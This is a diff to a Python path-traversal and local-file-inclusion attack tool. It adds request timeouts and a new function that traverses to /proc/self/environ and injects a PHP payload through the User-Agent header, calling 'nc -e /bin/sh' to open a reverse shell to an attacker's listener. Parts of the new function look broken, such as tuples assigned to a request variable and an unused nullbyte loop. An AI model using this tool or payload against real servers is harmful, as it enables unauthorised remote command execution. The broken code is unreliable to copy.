@@ -20,7 +20,7 @@ _____, ___
 from core.methods.session import session
 import requests, sys
 from core.colors import color
-from core.variables import payloadlist, nullchars
+from core.variables import payloadlist, nullchars, timeout, LISTENIP, LISTENPORT
 from core.methods.filecheck import filecheck
 from core.methods.loot import download
 from core.methods.print import progress, progresswin
@@ -30,23 +30,25 @@ global maxlen
 maxlen = len(max(payloadlist, key=len))
 
 """prepare request for inpath attack"""
-def inpath(traverse, dir, file, nb, url, url2):
+def inpath(traverse, dir, file, nb, url, url2, s):
     path=traverse+dir+file+nb+url2
     p = traverse+dir+file+nb
     req = requests.Request(method='GET', url=url)
-    prep = req.prepare()
+    #prep = req.prepare()
+    prep = s.prepare_request(req)
     prep.url = url + path
     return (prep, p)
 
 """prepare request for query attack"""
-def query(traverse, dir, file, nb, keyword, url, url2):
+def query(traverse, dir, file, nb, keyword, url, url2, s):
     if "?" not in url:
         query = "?" + keyword + "=" + traverse + dir + file + nb + url2
     else:
         query = "&" + keyword + "=" + traverse + dir + file + nb + url2
     p = traverse + dir + file + nb
     req = requests.Request(method='GET', url=url)
-    prep = req.prepare()
+    #prep = req.prepare()
+    prep = s.prepare_request(req)
     prep.url = url + query
     return (prep, p)
 
@@ -88,9 +90,15 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
 
     #initial ping for filecheck
     if attack != 4:
-        con2 = s.get(url).content
+        try:
+            con2 = s.get(url, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout with the initial check.")
     else:
-        con2 = s.post(url, data={}).content
+        try:
+            con2 = s.post(url, data={}, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout with the initial check.")
     for i in paylist:
         d = 0
         while d <= depth:
@@ -104,15 +112,27 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             #send attack requests - no nullbyte injection
             requestlist = []
             if attack == 1:
-                prep, p = query(traverse, "", file, "", keyword, url, url2)
-                r = s.send(prep)
+                prep, p = query(traverse, "", file, "", keyword, url, url2, s)
+                try:
+                    r = s.send(prep, timeout=timeout)
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    print("Timeout reached for " + url)
+                    continue
             elif attack == 2:
-                prep, p = inpath(traverse, "", file, "", url, url2)
-                r = s.send(prep)
+                prep, p = inpath(traverse, "", file, "", url, url2, s)
+                try:
+                    r = s.send(prep, timeout=timeout)
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    print("Timeout reached for " + url)
+                    continue
             elif attack == 3:
                 s.cookies.set(selected, traverse + file)
                 p = traverse + file
-                r = s.get(url)
+                try:
+                    r = s.get(url, timeout=timeout)
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    print("Timeout reached for " + url)
+                    continue
             elif attack == 4:
                 p = traverse + file
                 data = {}
@@ -122,21 +142,37 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                         pair[1] = p
                     data[pair[0].strip()] = pair[1].strip()
                 assert data != {}
-                r = s.post(url, data=data)
+                try:
+                    r = s.post(url, data=data, timeout=timeout)
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    print("Timeout reached for " + url)
+                    continue
             requestlist.append((r, p, ""))
 
             #repeat for nullbytes
             for nb in nullchars:
                 if attack == 1:
-                    prep, p = query(traverse, "", file, nb, keyword, url, url2)
-                    r = s.send(prep)
+                    prep, p = query(traverse, "", file, nb, keyword, url, url2, s)
+                    try:
+                        r = s.send(prep, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+                        continue
                 elif attack == 2:
-                    prep, p = inpath(traverse, "", file, nb, url, url2)
-                    r = s.send(prep)
+                    prep, p = inpath(traverse, "", file, nb, url, url2, s)
+                    try:
+                        r = s.send(prep, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+                        continue
                 elif attack == 3:
                     s.cookies.set(selected, traverse + file + nb)
                     p = traverse + file + nb
-                    r = s.get(url)
+                    try:
+                        r = s.get(url, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+                        continue
                 elif attack == 4:
                     p = traverse + file + nb
                     data = {}
@@ -146,7 +182,11 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                             pair[1] = p
                         data[pair[0].strip()] = pair[1].strip()
                     assert data != {}
-                    r = s.post(url, data=data)
+                    try:
+                        r = s.post(url, data=data, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+                        continue
                 requestlist.append((r, p, nb))
 
             #analyze result
@@ -223,9 +263,15 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
 
     #initial ping for filecheck
     if attack != 4:
-        con2 = s.get(url).content
+        try:
+            con2 = s.get(url, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout with the initial check.")
     else:
-        con2 = s.post(url, data={}).content
+        try:
+            con2 = s.post(url, data={}, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout with the initial check.")
     for dir in dirs:
         for file in files:
             d=1
@@ -243,15 +289,27 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                     if selected_nullbytes == []:
                         data = {}
                         if attack == 1:
-                            prep, p = query(traverse, dir, file, "", keyword, url, url2)
-                            r = s.send(prep)
+                            prep, p = query(traverse, dir, file, "", keyword, url, url2, s)
+                            try:
+                                r = s.send(prep, timeout=timeout)
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
                         elif attack == 2:
-                            prep, p = inpath(traverse, dir, file, "", url, url2)
-                            r = s.send(prep)
+                            prep, p = inpath(traverse, dir, file, "", url, url2, s)
+                            try:
+                                r = s.send(prep, timeout=timeout)
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
                         elif attack == 3:
                             p = traverse + dir + file
                             s.cookies.set(selected, traverse + dir + file)
-                            r = s.get(url)
+                            try:
+                                r = s.get(url, timeout=timeout)
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
                             #print(s.cookies)
                         elif attack == 4:
                             p = traverse + dir + file
@@ -261,21 +319,37 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                     pair[1] = p
                                 data[pair[0].strip()] = pair[1].strip()
                             assert data != {}
-                            r = s.post(url, data=data)
+                            try:
+                                r = s.post(url, data=data, timeout=timeout)
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
                         requestlist.append((r, p, data))
                     else:
                         for nb in selected_nullbytes:
                             data = {}
                             if attack == 1:
-                                prep, p = query(traverse, dir, file, nb, keyword, url, url2)
-                                r = s.send(prep)
+                                prep, p = query(traverse, dir, file, nb, keyword, url, url2, s)
+                                try:
+                                    r = s.send(prep, timeout=timeout)
+                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                    print("Timeout reached for " + url)
+                                    continue
                             elif attack == 2:
-                                prep, p = inpath(traverse, dir, file, nb, url, url2)
-                                r = s.send(prep)
+                                prep, p = inpath(traverse, dir, file, nb, url, url2, s)
+                                try:
+                                    r = s.send(prep, timeout=timeout)
+                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                    print("Timeout reached for " + url)
+                                    continue
                             elif attack == 3:
                                 p = traverse + dir + file + nb
                                 s.cookies.set(selected, traverse + dir + file + nb)
-                                r = s.get(url)
+                                try:
+                                    r = s.get(url, timeout=timeout)
+                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                    print("Timeout reached for " + url)
+                                    continue
                             elif attack == 4:
                                 p = traverse + dir + file + nb
                                 for prop in postdata.split("&"):
@@ -284,7 +358,11 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                         pair[1] = p
                                     data[pair[0].strip()] = pair[1].strip()
                                 assert data != {}
-                                r = s.post(url, data=data)
+                                try:
+                                    r = s.post(url, data=data, timeout=timeout)
+                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                    print("Timeout reached for " + url)
+                                    continue
                             requestlist.append((r, p, data))
 
                     #analyze result
@@ -344,3 +422,150 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                 print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
                 d+=1
     return (found, urls)
+
+def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata):
+    #resolve issues with inpath attack
+    if not url.endswith("/"):
+        url += "/"
+
+    s = session()
+
+    depth = 50
+    file = "/proc/self/environ"
+    success = None
+
+    if authcookie != "":
+        tmpjar = cookieFromFile(authcookie)
+        for cookie in tmpjar:
+            s.cookies.set_cookie(cookie)
+
+    #initial ping for filecheck
+    if attack != 4:
+        try:
+            con2 = s.get(url, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout with the initial check.")
+    else:
+        try:
+            con2 = s.post(url, data={}, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout with the initial check.")
+    for i in paylist:
+        d = 0
+        while d <= depth:
+            traverse=''
+            j=1
+            #chain traversal payloads
+            while j <= d:
+                traverse+=i
+                j+=1
+
+            #send attack requests - no nullbyte injection
+            requestlist = []
+            if nullist == []:
+                data = {}
+                if attack == 1:
+                    prep, p = query(traverse, "", file, "", keyword, url, url2, s)
+                    try:
+                        r = s.send(prep, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+                        continue
+                elif attack == 2:
+                    prep, p = inpath(traverse, "", file, "", url, url2, s)
+                    try:
+                        r = s.send(prep, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+                        continue
+                elif attack == 3:
+                    s.cookies.set(selected, traverse + file)
+                    p = traverse + file
+                    try:
+                        r = s.get(url, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+                        continue
+                elif attack == 4:
+                    p = traverse + file
+                    for prop in postdata.split("&"):
+                        pair = prop.split("=")
+                        if pair[1].strip() == "INJECT":
+                            pair[1] = p
+                        data[pair[0].strip()] = pair[1].strip()
+                    assert data != {}
+                    try:
+                        r = s.post(url, data=data, timeout=timeout)
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+                        continue
+                requestlist.append((r, p, "", data, prep))
+            else:
+                for nb in nullist:
+                    data = {}
+                    if attack == 1:
+                        prep, p = query(traverse, "", file, "", keyword, url, url2, s)
+                        try:
+                            r = s.send(prep, timeout=timeout)
+                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                            print("Timeout reached for " + url)
+                            continue
+                    elif attack == 2:
+                        prep, p = inpath(traverse, "", file, "", url, url2, s)
+                        try:
+                            r = s.send(prep, timeout=timeout)
+                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                            print("Timeout reached for " + url)
+                            continue
+                    elif attack == 3:
+                        s.cookies.set(selected, traverse + file)
+                        p = traverse + file
+                        try:
+                            r = s.get(url, timeout=timeout)
+                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                            print("Timeout reached for " + url)
+                            continue
+                    elif attack == 4:
+                        p = traverse + file
+                        for prop in postdata.split("&"):
+                            pair = prop.split("=")
+                            if pair[1].strip() == "INJECT":
+                                pair[1] = p
+                            data[pair[0].strip()] = pair[1].strip()
+                        assert data != {}
+                        try:
+                            r = s.post(url, data=data, timeout=timeout)
+                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                            print("Timeout reached for " + url)
+                            continue
+                    requestlist.append((r, p, "", data, traverse))
+
+
+            #analyze result
+            found = False
+            for (r, p, nb, data, traverse) in requestlist:
+                if attack == 3:
+                    s.cookies.set(selected, p)
+                if str(r.status_code).startswith("2"):
+                    if filecheck(r, con2, p) and attack != 4 or filecheck(r, con2, p, post=True) and attack == 4:
+                        success = (r, p, nb, data, traverse)
+                        found = True
+                        break
+            d+=1
+            if found:
+                break
+    
+    if success:
+        if attack == 1:
+            prep = query(success[4], "", file, success[2], keyword, url, url2, s)
+        elif attack == 2:
+            prep = inpath(success[4], "", file, success[2], url, url2, s)
+        elif attack == 3:
+            s.cookies.set(selected, success[1])
+            req = requests.Request(method='GET', url=url)
+            prep = s.prepare_request(req)
+        elif attack == 4:
+            req = requests.Request(method='POST', url=url, data=success[3])
+            prep = s.prepare_request(req)
+        prep.headers['User-agent'] = '<?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+        s.send(prep)
